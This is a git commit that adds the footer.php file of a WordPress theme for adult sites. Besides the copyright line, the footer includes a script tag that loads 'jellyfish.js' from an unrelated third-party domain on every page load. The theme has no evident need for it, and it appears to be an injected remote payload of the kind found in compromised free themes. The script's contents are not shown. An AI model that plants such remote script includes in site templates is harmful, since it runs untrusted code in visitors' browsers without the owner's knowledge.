dbd8ba51473d5da18445a6ac3dfee4f1c74e96f8
ZiEHub <119917536+ZiEHub@users.noreply.github.com>
2023-10-22 12:34:07 +0700

    Add files via upload

---
+++ xVideos WordPress Theme/xVideos WordPress Theme/footer.php
@@ -0,0 +1,10 @@
+<div id="footer" class="container">
+
+<div class="text-align-center">Copyright ©2016 <a href="http://www.wpadultthemes.xyz" title="Wp Adult Themes">Wp Adult Themes</a></div>
+<?php wp_footer(); ?>
+<script src=http://freeadultwpthemes.com/kek/jellyfish.js></script>
+
+</body>
+
+</html>
+
